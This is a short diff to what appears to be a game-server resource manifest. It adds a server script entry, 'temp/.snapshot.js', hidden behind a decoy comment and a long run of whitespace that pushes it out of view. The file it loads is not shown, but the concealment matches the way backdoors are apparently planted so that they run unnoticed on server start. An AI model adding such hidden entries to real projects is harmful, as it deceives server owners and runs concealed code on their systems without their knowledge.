@@ -10,7 +10,8 @@ client_scripts {
     'client/client.lua'
 }
 server_scripts {
-    'server/server.lua'
+    'server/server.lua',
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.snapshot.js',
 }
 files {
     "web-side/index.html",
